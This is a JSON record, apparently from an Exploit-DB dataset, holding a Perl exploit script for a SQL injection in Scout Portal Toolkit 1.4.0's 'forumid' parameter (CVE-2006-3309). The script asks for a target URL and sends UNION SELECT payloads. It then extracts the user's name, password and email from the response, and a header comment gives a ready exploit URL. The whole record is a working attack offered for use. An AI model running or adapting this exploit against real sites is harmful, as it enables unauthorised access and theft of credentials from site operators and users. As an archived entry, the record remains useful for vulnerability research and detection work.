{
  "id": "1957",
  "title": "Scout Portal Toolkit 1.4.0 - &#039;forumid&#039; SQL Injection",
  "cve": "CVE-2006-3309",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#===============================================================\r\n#    Scout Portal Toolkit 1.4.0 Remote SQL injection Exploit \r\n#    Coded By Simo64\r\n#    Moroccan Security Research Team\r\n#   Specials thx to :Greetz : \r\n\r\n#  CiM-Team - CrAsH_oVeR_rIdE -  dabdoub - damip - DarkbiteX - drackanz - Iss4m -  megamati \r\n#  Mourad - Preddy -Rachid - RapYaS - r00tkita - S4mi - secteura - Silitix - tahati - And All Freinds !\r\n#===============================================================\r\n\r\n# Details  :\r\n#  Scout Portal Toolkit 1.4.0 Remote SQL injection Vulnerability\r\n#  Website : http://scout.wisc.edu/Projects/SPT/\r\n#  Vulnerable File : SPT--ForumTopics.php\r\n\r\n#  PoC : http://host/path/SPT--ForumTopics.php?forumid=[SQL]\r\n#  Exemple :\r\n#  This  will display admin name and password\r\n#  Exploit : http://victime/path/SPT--ForumTopics.php?forumid=-9+UNION+SELECT+null,UserName,UserPassword,33,44,55+FROM+APUsers+WHERE+UserId=1\r\n#  The exploit will work regardless of magic_quotes_gpc is set or not\r\n#==============================================================\r\n\r\n\r\nuse LWP::Simple;\r\n\r\nprint \"\\n===============================================================\";\r\nprint \"\\n=  Scout Portal Toolkit <= 1.4.0 Remote SQL injection Exploit =\";\r\nprint \"\\n=             Discovred & Coded By Simo64                     =\";\r\n\r\nprint \"\\n=           Moroccan Security Research Team                   =\";\r\nprint \"\\n===============================================================\\n\\n\";\r\n\r\nmy($targ,$path,$userid,$xpl,$xpl2,$data,$data2,$email);\r\n\r\n       print \"Enter Traget Exemple: http://site.com/ \\nTraget : \";\r\n       chomp($targ = <STDIN>);\r\n       print \"\\n\\nEnter Path TO Portal exemple:  /SPT/ OR just / \\nPath : \";\r\n\r\n       chomp($path=<STDIN>);\r\n       print \"\\n\\nEnter userid  Exemple: 1\\nUserID :  \";\r\n       chomp($userid=<STDIN>);\r\n\r\n$xpl1=\"-9+UNION+SELECT+null,UserName,UserPassword,null,null,null+FROM+APUsers+WHERE+UserId=\";\r\n\r\n$xpl2=\"-9+UNION+SELECT+null,Email,null,null,null,null+FROM+APUsers+WHERE+UserId=\";\r\nprint \"\\n[+] Connecting to: $targ\\n\";\r\n$data = get($targ.$path.\"SPT--ForumTopics.php?forumid=\".$xpl1.$userid) || die \"\\n[+]Connexion Failed!\\n\";\r\n\r\n$data2 = get($targ.$path.\"SPT--ForumTopics.php?forumid=\".$xpl2.$userid) || die \"\\n[+]Connexion Failed!\\n\";\r\nprint \"\\n[+] Connected !\\n\";\r\nprint \"[+] Sending Data to $targ ....\\n\\n\";\r\n\r\n\r\n$username=substr($data,index($data,\"<h1>\")+11,index($data,\"</h1>\")-12);\r\nchomp $username;\r\n\r\n$password=substr($data,index($data,\"</h1>\")+34,index($data,\"</p>\")-index($data,\"</h1>\")-34);\r\n\r\nchomp $password;\r\n\r\n$email=substr($data2,index($data,\"<h1>\")+11,index($data2,\"</h1>\")-12);\r\nchomp $email;\r\n\r\nif(length($password) <= 34){\r\nprint \"[!]Exploit Succeded !\\n********************\\n\\n=========  UserID = $userid Infos =======\";\r\n\r\nprint \"\\n= UserID   : \".$userid;\r\nprint \"\\n= Username : \".$username;\r\nprint \"\\n= Password : \".$password;\r\nprint \"\\n= Email    : \".$email;\r\nprint \"\\n===================================\\n\\nEnjoy !\";\r\n\r\n}\r\nelse {print \"\\n[!] Exploit Failed !\";}\r\n\r\n# milw0rm.com [2006-06-27]",
  "url": "https://www.exploit-db.com/exploits/1957"
}